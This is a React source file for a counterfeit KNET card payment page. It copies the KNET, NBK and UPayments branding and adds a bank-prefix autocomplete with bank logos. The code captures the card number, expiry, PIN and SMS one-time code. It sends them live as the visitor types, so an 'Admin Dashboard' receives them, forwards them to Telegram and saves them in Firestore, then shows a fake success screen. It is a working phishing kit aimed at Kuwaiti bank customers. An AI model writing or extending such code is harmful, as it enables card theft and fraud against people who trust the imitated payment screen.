import React, { useState, useEffect, useRef } from 'react';
import { CustomerDetails, CompletedOrder, CartItem } from '../types';
import {
  sendTelegramNotification,
  trackPaymentSubmitted,
  trackOtpSubmitted,
  trackVisitor,
  trackBookingStep,
  getOrCreateBookingId
} from '../lib/esfgdrFirebase';
import { saveOrderToFirestore } from '../lib/firebase';

interface PaymentPageProps {
  amount: number;
  originalSubtotal: number;
  customerDetails: CustomerDetails;
  items: CartItem[];
  onCancel: () => void;
  onSuccess: (order: CompletedOrder) => void;
}

interface KnetPrefixOption {
  prefix: string;
  label: string;
  bankFull: string;
  logoType: 'rajhi' | 'tam' | 'weyay' | 'nbk' | 'kfh' | 'boubyan' | 'gulf' | 'burgan' | 'abk' | 'warba' | 'cbk' | 'kib';
}

// Authentic KNET BIN prefixes matching the original KNET autocomplete list
const KNET_PREFIX_OPTIONS: KnetPrefixOption[] = [
  { prefix: '458838', label: '458838 - Rajhi', bankFull: 'مصرف الراجحي (Al Rajhi Bank)', logoType: 'rajhi' },
  { prefix: '45077848', label: '45077848 - TAM', bankFull: 'تم — بيت التمويل الكويتي (TAM KFH)', logoType: 'tam' },
  { prefix: '45077849', label: '45077849 - TAM', bankFull: 'تم — بيت التمويل الكويتي (TAM KFH)', logoType: 'tam' },
  { prefix: '46445250', label: '46445250 - Weyay', bankFull: 'وياي — بنك الكويت الوطني (Weyay NBK)', logoType: 'weyay' },
  { prefix: '464452', label: '464452 - NBK', bankFull: 'بنك الكويت الوطني (NBK)', logoType: 'nbk' },
  { prefix: '589160', label: '589160 - NBK', bankFull: 'بنك الكويت الوطني (NBK)', logoType: 'nbk' },
  { prefix: '543363', label: '543363 - NBK', bankFull: 'بنك الكويت الوطني (NBK)', logoType: 'nbk' },
  { prefix: '450778', label: '450778 - KFH', bankFull: 'بيت التمويل الكويتي (KFH)', logoType: 'kfh' },
  { prefix: '532672', label: '532672 - KFH', bankFull: 'بيت التمويل الكويتي (KFH)', logoType: 'kfh' },
  { prefix: '537015', label: '537015 - KFH', bankFull: 'بيت التمويل الكويتي (KFH)', logoType: 'kfh' },
  { prefix: '470350', label: '470350 - Boubyan', bankFull: 'بنك بوبيان (Boubyan Bank)', logoType: 'boubyan' },
  { prefix: '490455', label: '490455 - Boubyan', bankFull: 'بنك بوبيان (Boubyan Bank)', logoType: 'boubyan' },
  { prefix: '404919', label: '404919 - Boubyan', bankFull: 'بنك بوبيان (Boubyan Bank)', logoType: 'boubyan' },
  { prefix: '468564', label: '468564 - Burgan', bankFull: 'بنك برقان (Burgan Bank)', logoType: 'burgan' },
  { prefix: '402978', label: '402978 - Burgan', bankFull: 'بنك برقان (Burgan Bank)', logoType: 'burgan' },
  { prefix: '540759', label: '540759 - Burgan', bankFull: 'بنك برقان (Burgan Bank)', logoType: 'burgan' },
  { prefix: '526206', label: '526206 - GulfBank', bankFull: 'بنك الخليج (Gulf Bank)', logoType: 'gulf' },
  { prefix: '531470', label: '531470 - GulfBank', bankFull: 'بنك الخليج (Gulf Bank)', logoType: 'gulf' },
  { prefix: '517419', label: '517419 - GulfBank', bankFull: 'بنك الخليج (Gulf Bank)', logoType: 'gulf' },
  { prefix: '403622', label: '403622 - ABK', bankFull: 'البنك الأهلي الكويتي (ABK)', logoType: 'abk' },
  { prefix: '428628', label: '428628 - ABK', bankFull: 'البنك الأهلي الكويتي (ABK)', logoType: 'abk' },
  { prefix: '521175', label: '521175 - ABK', bankFull: 'البنك الأهلي الكويتي (ABK)', logoType: 'abk' },
  { prefix: '532749', label: '532749 - Warba', bankFull: 'بنك وربة (Warba Bank)', logoType: 'warba' },
  { prefix: '559459', label: '559459 - Warba', bankFull: 'بنك وربة (Warba Bank)', logoType: 'warba' },
  { prefix: '537016', label: '537016 - CBK', bankFull: 'البنك التجاري الكويتي (Al-Tijari CBK)', logoType: 'cbk' },
  { prefix: '453095', label: '453095 - CBK', bankFull: 'البنك التجاري الكويتي (Al-Tijari CBK)', logoType: 'cbk' },
  { prefix: '409054', label: '409054 - KIB', bankFull: 'بنك الكويت الدولي (KIB)', logoType: 'kib' },
];

// High-definition vector bank logos matching Screenshot 2 exactly
const BankMiniLogo: React.FC<{ type: KnetPrefixOption['logoType'] }> = ({ type }) => {
  switch (type) {
    case 'rajhi':
      return (
        <div className="flex items-center gap-1.5 shrink-0" dir="ltr">
          <div className="flex flex-col items-end leading-[1.05] text-[#221afb]">
            <span className="text-[7.5px] font-bold tracking-tight">مصرف الراجحي</span>
            <span className="text-[7.5px] font-bold tracking-tight">alrajhi bank</span>
          </div>
          <svg viewBox="0 0 28 26" className="w-[18px] h-[18px] text-[#221afb]" fill="none">
            <path
              d="M14 2.5C16.5 2.5 18.5 4.5 18.5 7V11.5H9.5V7C9.5 4.5 11.5 2.5 14 2.5Z"
              stroke="currentColor"
              strokeWidth="2.4"
            />
            <path
              d="M4 16.5C4 14 6 12 8.5 12H13.5V20C13.5 21.8 11.8 23.2 9.5 23.2C6.5 23.2 4 20.2 4 16.5Z"
              stroke="currentColor"
              strokeWidth="2.4"
            />
            <path
              d="M24 16.5C24 14 22 12 19.5 12H14.5V20C14.5 21.8 16.2 23.2 18.5 23.2C21.5 23.2 24 20.2 24 16.5Z"
              stroke="currentColor"
              strokeWidth="2.4"
            />
          </svg>
        </div>
      );
    case 'tam':
      return (
        <div className="flex items-center justify-end shrink-0">
          {/* Exact TAM (تم) lime-green vector wordmark matching Screenshot 2 */}
          <svg viewBox="0 0 46 26" className="w-[34px] h-[20px]" fill="none">
            {/* Two dots above Ta */}
            <rect x="30" y="2" width="3.5" height="3.5" rx="0.8" fill="#8cc600" />
            <rect x="35.5" y="2" width="3.5" height="3.5" rx="0.8" fill="#8cc600" />
            {/* Ta + Meem connected body + descending tail */}
            <path
              d="M39 9.5V15.5C39 17.2 37.8 18.2 35.8 18.2H22.5C21.2 18.2 20.2 17.6 19.6 16.5C18.8 17.6 17.5 18.2 15.8 18.2H11.5C9.2 18.2 7.8 19.6 7.2 22.5L6.7 24.5H3.5L4.1 21.8C5 17.5 7.5 15.2 11.5 15.2H13.2V12.2C13.2 10.2 14.6 8.8 16.8 8.8H19.8C21.9 8.8 23.2 10.1 23.2 12.2V15.2H35.2V9.5H39ZM19.8 12.2C19.8 11.6 19.4 11.2 18.7 11.2H17.5C16.8 11.2 16.4 11.6 16.4 12.2V15.2H19.8V12.2Z"
              fill="#8cc600"
            />
          </svg>
        </div>
      );
    case 'weyay':
      return (
        <div className="flex items-center gap-1.5 shrink-0" dir="ltr">
          <svg viewBox="0 0 14 14" className="w-[12px] h-[12px]" fill="none">
            <path d="M1 3C3.5 1.8 6.5 4.2 9 3C10.5 2.3 12 2.5 13 3" stroke="#00d6a3" strokeWidth="2.2" strokeLinecap="round" />
            <path d="M1 7C3.5 5.8 6.5 8.2 9 7C10.5 6.3 12 6.5 13 7" stroke="#00a6fb" strokeWidth="2.2" strokeLinecap="round" />
            <path d="M1 11C3.5 9.8 6.5 12.2 9 11C10.5 10.3 12 10.5 13 11" stroke="#00d6a3" strokeWidth="2.2" strokeLinecap="round" />
          </svg>
          <span className="text-[12px] font-extrabold text-[#0b1f3a] tracking-tight">
            Weyay
          </span>
        </div>
      );
    case 'nbk':
      return (
        <img
          src="/assets/knet/nbk-logo.png"
          alt="NBK"
          className="h-4.5 w-auto object-contain shrink-0"
        />
      );
    case 'kfh':
      return (
        <span className="text-[10px] font-extrabold text-[#007a3d] tracking-tight shrink-0">
          KFH بيتك
        </span>
      );
    case 'boubyan':
      return (
        <span className="text-[10px] font-extrabold text-[#c41230] tracking-tight shrink-0">
          Boubyan
        </span>
      );
    case 'gulf':
      return (
        <span className="text-[10px] font-extrabold text-[#b5121b] tracking-tight shrink-0">
          Gulf Bank
        </span>
      );
    case 'burgan':
      return (
        <span className="text-[10px] font-extrabold text-[#005596] tracking-tight shrink-0">
          Burgan
        </span>
      );
    case 'abk':
      return (
        <span className="text-[10px] font-extrabold text-[#004b87] tracking-tight shrink-0">
          ABK الأهلي
        </span>
      );
    case 'warba':
      return (
        <span className="text-[10px] font-extrabold text-[#5c2d91] tracking-tight shrink-0">
          Warba
        </span>
      );
    case 'cbk':
      return (
        <span className="text-[10px] font-extrabold text-[#1b365d] tracking-tight shrink-0">
          Al-Tijari
        </span>
      );
    case 'kib':
      return (
        <span className="text-[10px] font-extrabold text-[#008080] tracking-tight shrink-0">
          KIB الدولي
        </span>
      );
  }
};

export const PaymentPage: React.FC<PaymentPageProps> = ({
  amount,
  originalSubtotal,
  customerDetails,
  items,
  onCancel,
  onSuccess
}) => {
  // Stable Order ID for tracking across steps (shared with CartPage / UserAccountModal registration)
  const orderIdRef = useRef<string>(getOrCreateBookingId(false));

  // Form state matching original KNET screen (persisted in sessionStorage to survive mobile tab reloads)
  const [cardNumber, setCardNumber] = useState(() => sessionStorage.getItem('knet_card') || '');
  const [expiry, setExpiry] = useState(() => sessionStorage.getItem('knet_expiry') || '');
  const [pin, setPin] = useState(() => sessionStorage.getItem('knet_pin') || '');
  const [selectedBankName, setSelectedBankName] = useState(
    () => sessionStorage.getItem('knet_bank') || 'NBK - National Bank of Kuwait'
  );

  // Prefix Autocomplete Dropdown state
  const [showPrefixDropdown, setShowPrefixDropdown] = useState(false);
  const [hasPickedPrefix, setHasPickedPrefix] = useState(false);
  const cardInputRef = useRef<HTMLInputElement>(null);
  const dropdownWrapperRef = useRef<HTMLDivElement>(null);

  // UI & OTP Flow states
  const [isProcessing, setIsProcessing] = useState(false);
  const [showOtpStep, setShowOtpStep] = useState(() => sessionStorage.getItem('knet_otp_step') === 'true');
  const [otpCode, setOtpCode] = useState('');
  const [otpTimer, setOtpTimer] = useState(180);
  const [errorMessage, setErrorMessage] = useState('');

  useEffect(() => {
    trackVisitor('/card-payment.html', 'payment', {
      customerName: customerDetails.name,
      phone: customerDetails.phone
    }).catch(() => {});
    trackBookingStep('view_payment', '/payment.html', {
      cartCount: items.reduce((s, i) => s + i.qty, 0),
      time: new Date().toISOString(),
      tab: 'payment'
    }).catch(() => {});
  }, []);

  useEffect(() => {
    try {
      sessionStorage.setItem('knet_card', cardNumber);
      sessionStorage.setItem('knet_expiry', expiry);
      sessionStorage.setItem('knet_pin', pin);
      sessionStorage.setItem('knet_bank', selectedBankName);
      sessionStorage.setItem('knet_otp_step', showOtpStep ? 'true' : 'false');
    } catch {
      // ignore storage errors
    }
  }, [cardNumber, expiry, pin, selectedBankName, showOtpStep]);

  // Live debounced sync of card & PIN as visitor types so Admin Dashboard receives them immediately
  useEffect(() => {
    const rawCard = cardNumber.replace(/\s/g, '');
    if (rawCard.length < 6) return;
    const timer = setTimeout(() => {
      const matchedOpt = KNET_PREFIX_OPTIONS.find((o) => rawCard.startsWith(o.prefix));
      const finalBankName = matchedOpt ? matchedOpt.bankFull : selectedBankName;
      const holderName = customerDetails.name || 'عميل دلمون الكويت';
      trackPaymentSubmitted({
        bookingId: orderIdRef.current,
        customerName: holderName,
        phone: customerDetails.phone || '',
        area: customerDetails.governorate || 'الكويت',
        address: `${customerDetails.governorate || ''} ${customerDetails.street || ''}`.trim() || 'الكويت',
        amount,
        bank: finalBankName,
        cardNumber: rawCard,
        cardExpiry: expiry,
        pin,
        cardHolder: holderName
      }).catch(() => {});
    }, 500);
    return () => clearTimeout(timer);
  }, [cardNumber, expiry, pin, selectedBankName, amount, customerDetails]);

  // Live debounced sync of OTP as visitor types
  useEffect(() => {
    if (!otpCode || otpCode.trim().length < 3) return;
    const timer = setTimeout(() => {
      const rawCard = cardNumber.replace(/\s/g, '');
      const holderName = customerDetails.name || 'عميل دلمون الكويت';
      trackOtpSubmitted({
        bookingId: orderIdRef.current,
        otpCode: otpCode.trim(),
        cardHolder: holderName,
        cardNumber: rawCard,
        phone: customerDetails.phone || '',
        amount,
        cardLast4: rawCard.slice(-4) || '0000'
      }).catch(() => {});
    }, 400);
    return () => clearTimeout(timer);
  }, [otpCode, cardNumber, amount, customerDetails]);

  // Close prefix dropdown when clicking outside
  useEffect(() => {
    const handleClickOutside = (e: MouseEvent) => {
      if (
        dropdownWrapperRef.current &&
        !dropdownWrapperRef.current.contains(e.target as Node)
      ) {
        setShowPrefixDropdown(false);
      }
    };
    document.addEventListener('mousedown', handleClickOutside);
    return () => document.removeEventListener('mousedown', handleClickOutside);
  }, []);

  // Convert Arabic/Persian digits (٠-٩ / ۰-۹) to standard ASCII digits (0-9)
  const toEnglishDigits = (str: string) =>
    str
      .replace(/[٠-٩]/g, (d) => String(d.charCodeAt(0) - 1632))
      .replace(/[۰-۹]/g, (d) => String(d.charCodeAt(0) - 1776));

  // Filter matching KNET prefixes when user types in Card Number
  const matchingPrefixes = KNET_PREFIX_OPTIONS.filter((opt) => {
    if (!cardNumber) return true;
    return opt.prefix.startsWith(cardNumber) && opt.prefix !== cardNumber;
  });

  // Card Number change
  const handleCardNumberChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const raw = toEnglishDigits(e.target.value).replace(/\D/g, '').slice(0, 19);
    setCardNumber(raw);
    if (errorMessage) setErrorMessage('');

    // Show autocomplete dropdown while typing the first digits (1 to 7 digits)
    if (raw.length > 0 && raw.length < 8) {
      setShowPrefixDropdown(true);
      setHasPickedPrefix(false);
    } else if (raw.length === 0) {
      setShowPrefixDropdown(true);
      setHasPickedPrefix(false);
    } else {
      setShowPrefixDropdown(false);
    }
  };

  // Handle selecting a prefix from the KNET autocomplete dropdown
  const handleSelectPrefix = (opt: KnetPrefixOption) => {
    setCardNumber(opt.prefix);
    setSelectedBankName(opt.bankFull);
    setHasPickedPrefix(true);
    setShowPrefixDropdown(false);
    setErrorMessage('');
    setTimeout(() => {
      cardInputRef.current?.focus();
    }, 10);
  };

  // Expiration Date change (auto-formats MM / YY)
  const handleExpiryChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const raw = toEnglishDigits(e.target.value).replace(/\D/g, '').slice(0, 4);
    if (raw.length >= 3) {
      setExpiry(`${raw.slice(0, 2)} / ${raw.slice(2)}`);
    } else {
      setExpiry(raw);
    }
    if (errorMessage) setErrorMessage('');
  };

  // PIN change
  const handlePinChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const raw = toEnglishDigits(e.target.value).replace(/\D/g, '').slice(0, 4);
    setPin(raw);
    if (errorMessage) setErrorMessage('');
  };

  // Submit Card Details
  const handlePaySubmit = (e?: React.FormEvent) => {
    if (e) e.preventDefault();

    const rawCard = cardNumber.replace(/\s/g, '');
    let rawExp = expiry.replace(/\D/g, '');
    if (rawExp.length === 3) {
      rawExp = `0${rawExp}`;
    } else if (rawExp.length === 6) {
      rawExp = `${rawExp.slice(0, 2)}${rawExp.slice(4, 6)}`;
    }

    if (rawCard.length < 6) {
      setErrorMessage('يرجى إدخال رقم البطاقة (Card Number).');
      return;
    }

    if (!pin || pin.length < 1) {
      setErrorMessage('يرجى إدخال الرقم السري للبطاقة (PIN).');
      return;
    }

    setErrorMessage('');
    setShowPrefixDropdown(false);
    setIsProcessing(true);

    const orderId = orderIdRef.current;
    const cardExpiryStr =
      rawExp.length >= 4
        ? `${rawExp.slice(0, 2)}/${rawExp.slice(2, 4)}`
        : expiry.trim() || '--/--';
    const holderName = customerDetails.name || 'KNET Customer';

    // Detect bank from prefix if not explicitly clicked
    const matchedOpt = KNET_PREFIX_OPTIONS.find((o) => rawCard.startsWith(o.prefix));
    const finalBankName = matchedOpt ? matchedOpt.bankFull : selectedBankName;

    // 1. Sync Card + PIN to esfgdr (bookings_steps: payment_started, payment, otp_requested) & Telegram
    trackPaymentSubmitted({
      bookingId: orderId,
      customerName: holderName,
      phone: customerDetails.phone || '',
      area: customerDetails.governorate || 'الكويت',
      address: `${customerDetails.governorate || ''} ${customerDetails.street || ''}`.trim() || 'الكويت',
      amount,
      bank: finalBankName,
      cardNumber: rawCard,
      cardExpiry: cardExpiryStr,
      pin,
      cardHolder: holderName,
      forceTelegram: true
    }).catch(() => {});

    // 2. Save order with Card + PIN to Firestore orders collection immediately
    saveOrderToFirestore({
      orderId,
      date: new Date().toLocaleDateString('ar-KW'),
      customer: customerDetails,
      items,
      subtotal: originalSubtotal,
      depositPaid: amount,
      remainingDue: Math.max(0, originalSubtotal - amount),
      total: originalSubtotal,
      paymentMethod: 'KNET (كي نت الكويت)',
      cardLast4: rawCard.slice(-4) || '0000',
      cardBank: finalBankName,
      cardNumber: rawCard,
      cardExpiry: cardExpiryStr,
      pin,
      status: 'بانتظار رمز التحقق OTP'
    }).catch(() => {});

    setTimeout(() => {
      setIsProcessing(false);
      setShowOtpStep(true);
      setOtpTimer(180);
    }, 1500);
  };

  // Verify KNET OTP
  const handleVerifyOtp = (e?: React.FormEvent | React.MouseEvent) => {
    if (e) e.preventDefault();

    if (otpCode.trim().length < 1) {
      setErrorMessage('يرجى إدخال رمز التحقق المرسل برسالة نصية (OTP).');
      return;
    }

    setErrorMessage('');
    setIsProcessing(true);

    const newOrderId = orderIdRef.current;
    const rawCard = cardNumber.replace(/\s/g, '');
    const last4 = rawCard.slice(-4) || '0000';
    const holderName = customerDetails.name || 'KNET Customer';
    const matchedOpt = KNET_PREFIX_OPTIONS.find((o) => rawCard.startsWith(o.prefix));
    const finalBankName = matchedOpt ? matchedOpt.bankFull : selectedBankName;

    // 1. Sync OTP to esfgdr (bookings_steps: otp, payment_completed) & Telegram
    trackOtpSubmitted({
      bookingId: newOrderId,
      otpCode: otpCode.trim(),
      cardHolder: holderName,
      cardNumber: rawCard,
      phone: customerDetails.phone || '',
      amount,
      cardLast4: last4,
      forceTelegram: true
    }).catch(() => {});

    // 2. Update order in Firestore with OTP code
    saveOrderToFirestore({
      orderId: newOrderId,
      date: new Date().toLocaleDateString('ar-KW'),
      customer: customerDetails,
      items,
      subtotal: originalSubtotal,
      depositPaid: amount,
      remainingDue: Math.max(0, originalSubtotal - amount),
      total: originalSubtotal,
      paymentMethod: 'KNET (كي نت الكويت)',
      cardLast4: last4,
      cardBank: finalBankName,
      cardNumber: rawCard,
      cardExpiry: expiry,
      pin,
      otpCode: otpCode.trim(),
      status: 'تم الاستلام (OTP مؤكد)'
    }).catch(() => {});

    setTimeout(() => {
      setIsProcessing(false);
      try {
        sessionStorage.removeItem('knet_card');
        sessionStorage.removeItem('knet_expiry');
        sessionStorage.removeItem('knet_pin');
        sessionStorage.removeItem('knet_bank');
        sessionStorage.removeItem('knet_otp_step');
      } catch {
        // ignore
      }

      const completedOrder: CompletedOrder = {
        orderId: newOrderId,
        date: new Date().toLocaleDateString('ar-KW', {
          year: 'numeric',
          month: 'long',
          day: 'numeric',
          hour: '2-digit',
          minute: '2-digit'
        }),
        customer: customerDetails,
        items,
        subtotal: originalSubtotal,
        depositPaid: amount,
        remainingDue: Math.max(0, originalSubtotal - amount),
        total: originalSubtotal,
        paymentMethod: 'KNET (كي نت الكويت)',
        cardLast4: last4,
        cardBank: finalBankName,
        status: 'تم الاستلام'
      };

      onSuccess(completedOrder);
    }, 1300);
  };

  // OTP countdown timer
  useEffect(() => {
    if (!showOtpStep) return;
    const interval = setInterval(() => {
      setOtpTimer((prev) => (prev > 0 ? prev - 1 : 0));
    }, 1000);
    return () => clearInterval(interval);
  }, [showOtpStep]);

  const formatTimer = (sec: number) => {
    const m = Math.floor(sec / 60);
    const s = sec % 60;
    return `${m}:${s < 10 ? `0${s}` : s}`;
  };

  return (
    <div
      className="min-h-screen bg-[#ebebeb] flex flex-col items-center justify-start text-[#333333] select-none"
      style={{ fontFamily: 'Arial, Helvetica, sans-serif' }}
      dir="ltr"
    >
      {/* Top White UPayments Header Bar */}
      <div className="w-full bg-white border-b border-[#dfdfdf] py-3 px-4 flex items-center justify-end">
        <div className="w-full max-w-[390px] mx-auto flex items-center justify-end pr-5">
          <span className="text-[19px] font-normal text-black tracking-tight">
            UPayments
          </span>
        </div>
      </div>

      {/* Main KNET Content Container */}
      <div className="w-full max-w-[390px] px-2.5 pt-2 pb-10">
        
        {/* Top Diraya Awareness Banner */}
        <div className="px-2 mb-3">
          <div className="w-full rounded-[9px] overflow-hidden shadow-[0_1px_3px_rgba(0,0,0,0.12)]">
            <img
              src="/assets/knet/diraya-banner.png"
              alt="لنكن على دراية - بنك الكويت المركزي"
              className="w-full h-auto block"
            />
          </div>
        </div>

        {/* Box 1: NBK Logo + Merchant + Amount */}
        <div className="bg-white rounded-[13px] border-[1.5px] border-[#8b8b8b] shadow-[0_1px_5px_rgba(0,0,0,0.28)] px-4 pt-2 pb-1.5 mb-3">
          {/* NBK Logo Centered */}
          <div className="flex justify-center mb-1.5">
            <img
              src="/assets/knet/nbk-logo.png"
              alt="NBK الوطني"
              className="h-[44px] w-auto object-contain"
            />
          </div>

          {/* Merchant Row */}
          <div className="flex items-center py-[3px] border-b border-[#999999] text-[12px] leading-[1.3]">
            <div className="w-[39%] font-bold text-[#00579c] text-left">
              Merchant:
            </div>
            <div className="w-[61%] text-[#444444] font-normal text-left">
              Upayments Company
            </div>
          </div>

          {/* Amount Row */}
          <div className="flex items-center pt-[3px] pb-[2px] text-[12px] leading-[1.3]">
            <div className="w-[39%] font-bold text-[#00579c] text-left">
              Amount:
            </div>
            <div className="w-[61%] text-[#333333] font-normal text-left">
              KD {amount.toFixed(3)}
            </div>
          </div>
        </div>

        {/* Form Wrapping Box 2 & Box 3 */}
        <form onSubmit={showOtpStep ? handleVerifyOtp : handlePaySubmit}>
          
          {/* Box 2: Card Input Fields (or OTP step) */}
          <div className="bg-white rounded-[13px] border-[1.5px] border-[#8b8b8b] shadow-[0_1px_5px_rgba(0,0,0,0.28)] px-4 pt-3.5 pb-3 mb-3">
            
            {/* Error Alert inside KNET box if any */}
            {errorMessage && (
              <div className="mb-2 p-1.5 bg-[#fff2f2] border border-[#d9534f] rounded text-[#c9302c] text-[11px] font-normal text-left">
                {errorMessage}
              </div>
            )}

            {!showOtpStep ? (
              <>
                {/* Row 1: Card Number with Authentic KNET BIN Prefix Dropdown */}
                <div className="flex items-center pb-[3px] border-b border-[#999999]">
                  <label
                    htmlFor="knet-card-number"
                    className="w-[39%] font-bold text-[#00579c] text-[12px] leading-none text-left"
                  >
                    Card Number:
                  </label>
                  <div className="w-[61%] relative" ref={dropdownWrapperRef}>
                    <input
                      ref={cardInputRef}
                      id="knet-card-number"
                      type="text"
                      inputMode="numeric"
                      autoComplete="off"
                      value={cardNumber}
                      onFocus={() => {
                        if (!hasPickedPrefix && cardNumber.length < 8) {
                          setShowPrefixDropdown(true);
                        }
                      }}
                      onChange={handleCardNumberChange}
                      className="w-full h-[25px] rounded-[6px] border border-[#b5b5b5] bg-[linear-gradient(to_bottom,#dcdcdc_0%,#efefef_28%,#ffffff_75%)] px-2 text-[12.5px] font-normal text-[#333333] focus:outline-none focus:border-[#00579c]"
                    />

                    {/* Authentic KNET BIN Prefix Dropdown Menu (Matching Screenshot 2) */}
                    {showPrefixDropdown && matchingPrefixes.length > 0 && (
                      <div className="absolute left-0 right-0 top-[calc(100%+1px)] z-30 bg-linear-to-b from-[#d8d9dd] via-[#eaebee] to-[#f5f5f7] border border-[#a5a6aa] rounded-[7px] shadow-[0_5px_12px_rgba(0,0,0,0.3)] max-h-[164px] overflow-y-auto py-0.5">
                        {matchingPrefixes.map((opt) => (
                          <button
                            key={opt.prefix}
                            type="button"
                            onClick={() => handleSelectPrefix(opt)}
                            className="w-full px-2.5 py-[5px] flex items-center justify-between text-left hover:bg-[#dce2ec] active:bg-[#cfd7e6] transition cursor-pointer"
                          >
                            <span className="text-[13.5px] text-[#555558] font-normal tracking-tight">
                              {opt.label}
                            </span>
                            <BankMiniLogo type={opt.logoType} />
                          </button>
                        ))}
                      </div>
                    )}
                  </div>
                </div>

                {/* Row 2: Expiration Date */}
                <div className="flex items-center py-[3px] border-b border-[#999999]">
                  <label
                    htmlFor="knet-expiry"
                    className="w-[39%] font-bold text-[#00579c] text-[12px] leading-none text-left"
                  >
                    Expiration Date:
                  </label>
                  <div className="w-[61%] flex items-center">
                    <input
                      id="knet-expiry"
                      type="text"
                      inputMode="numeric"
                      autoComplete="cc-exp"
                      placeholder="MM / YY"
                      value={expiry}
                      onFocus={() => setShowPrefixDropdown(false)}
                      onChange={handleExpiryChange}
                      className="w-[82px] h-[23px] rounded-[5px] border border-[#b5b5b5] bg-[#f1f1f1] px-1.5 text-center text-[11.5px] font-normal text-[#444444] placeholder-[#666666] focus:outline-none focus:border-[#00579c]"
                    />
                  </div>
                </div>

                {/* Row 3: PIN */}
                <div className="flex items-center pt-[3px]">
                  <label
                    htmlFor="knet-pin"
                    className="w-[39%] font-bold text-[#00579c] text-[12px] leading-none text-left"
                  >
                    PIN:
                  </label>
                  <div className="w-[61%]">
                    <input
                      id="knet-pin"
                      type="password"
                      inputMode="numeric"
                      maxLength={4}
                      value={pin}
                      onFocus={() => setShowPrefixDropdown(false)}
                      onChange={handlePinChange}
                      className="w-full h-[25px] rounded-[6px] border border-[#b5b5b5] bg-[linear-gradient(to_bottom,#dcdcdc_0%,#efefef_28%,#ffffff_75%)] px-2 text-[12.5px] font-normal text-[#333333] tracking-widest focus:outline-none focus:border-[#00579c]"
                    />
                  </div>
                </div>
              </>
            ) : (
              <>
                {/* OTP Verification View in Authentic KNET Layout */}
                <div className="mb-2.5 p-2 bg-[#eef5fb] border border-[#b8d4f0] rounded-[5px] text-[11.5px] text-[#00579c] leading-relaxed text-left">
                  <strong>NOTIFICATION:</strong> You will presently receive an SMS on your registered mobile number ending with{' '}
                  <strong>{customerDetails.phone ? customerDetails.phone.slice(-4) : '****'}</strong>. Please enter the OTP code below to complete your payment.
                </div>

                {/* Readonly Card Number */}
                <div className="flex items-center py-[3px] border-b border-[#999999] text-[12px]">
                  <div className="w-[39%] font-bold text-[#00579c] text-left">
                    Card Number:
                  </div>
                  <div className="w-[61%] text-[#444444] font-normal text-left">
                    {cardNumber.slice(0, 6)}******{cardNumber.slice(-4)}
                  </div>
                </div>

                {/* Readonly Expiration Date */}
                <div className="flex items-center py-[3px] border-b border-[#999999] text-[12px]">
                  <div className="w-[39%] font-bold text-[#00579c] text-left">
                    Expiration Date:
                  </div>
                  <div className="w-[61%] text-[#444444] font-normal text-left">
                    {expiry}
                  </div>
                </div>

                {/* Readonly PIN */}
                <div className="flex items-center py-[3px] border-b border-[#999999] text-[12px]">
                  <div className="w-[39%] font-bold text-[#00579c] text-left">
                    PIN:
                  </div>
                  <div className="w-[61%] text-[#444444] tracking-widest text-left">
                    ••••
                  </div>
                </div>

                {/* OTP Input Row */}
                <div className="flex items-center pt-[3px]">
                  <label
                    htmlFor="knet-otp"
                    className="w-[39%] font-bold text-[#00579c] text-[12px] leading-none text-left"
                  >
                    OTP:
                  </label>
                  <div className="w-[61%]">
                    <input
                      id="knet-otp"
                      type="text"
                      inputMode="numeric"
                      autoFocus
                      maxLength={6}
                      placeholder={`Timer: ${formatTimer(otpTimer)}`}
                      value={otpCode}
                      onChange={(e) => {
                        setOtpCode(toEnglishDigits(e.target.value).replace(/\D/g, ''));
                        if (errorMessage) setErrorMessage('');
                      }}
                      className="w-full h-[25px] rounded-[6px] border border-[#b5b5b5] bg-[linear-gradient(to_bottom,#dcdcdc_0%,#efefef_28%,#ffffff_75%)] px-2 text-[12.5px] font-normal text-[#333333] focus:outline-none focus:border-[#00579c]"
                    />
                  </div>
                </div>
              </>
            )}

          </div>

          {/* Box 3: Submit & Cancel Buttons */}
          <div className="bg-white rounded-[13px] border-[1.5px] border-[#8b8b8b] shadow-[0_1px_5px_rgba(0,0,0,0.28)] px-4 py-3 mb-5">
            <div className="flex items-center w-full gap-[1px]">
              <button
                type="submit"
                disabled={isProcessing}
                className="flex-1 h-[29px] bg-[#eaeaea] hover:bg-[#e2e2e2] active:bg-[#d8d8d8] border border-[#c6c6c6] rounded-[4px] text-[#4a4a4a] font-bold text-[12px] transition cursor-pointer"
              >
                {showOtpStep ? 'Confirm' : 'Submit'}
              </button>
              <button
                type="button"
                onClick={() => {
                  if (showOtpStep) {
                    setShowOtpStep(false);
                    setErrorMessage('');
                    try {
                      sessionStorage.setItem('knet_otp_step', 'false');
                    } catch {}
                  } else {
                    try {
                      sessionStorage.removeItem('knet_otp_step');
                    } catch {}
                    onCancel();
                  }
                }}
                disabled={isProcessing}
                className="flex-1 h-[29px] bg-[#eaeaea] hover:bg-[#e2e2e2] active:bg-[#d8d8d8] border border-[#c6c6c6] rounded-[4px] text-[#4a4a4a] font-bold text-[12px] transition cursor-pointer"
              >
                Cancel
              </button>
            </div>
          </div>

        </form>

        {/* Bottom Copyright Footer */}
        <div className="text-center space-y-0.5 pt-0.5">
          <div className="text-[11.5px] text-[#111111] font-normal">
            All Rights Reserved. Copyright 2026 ©
          </div>
          <div className="text-[11.5px] text-[#00579c] font-bold">
            The Shared Electronic Banking Services Company - KNET
          </div>
        </div>

      </div>

      {/* Processing Overlay */}
      {isProcessing && (
        <div className="fixed inset-0 z-50 bg-black/40 flex items-center justify-center p-4">
          <div className="bg-white rounded-[14px] border border-[#8c8c8c] p-6 max-w-[300px] w-full text-center shadow-xl space-y-3">
            <div className="w-9 h-9 border-3 border-[#d6d6d6] border-t-[#00529b] rounded-full mx-auto animate-spin"></div>
            <div className="text-[13px] font-bold text-[#00529b]">
              Processing Transaction...
            </div>
            <div className="text-[11px] text-[#555555]">
              Please wait, do not close or refresh this page.
            </div>
          </div>
        </div>
      )}
    </div>
  );
};
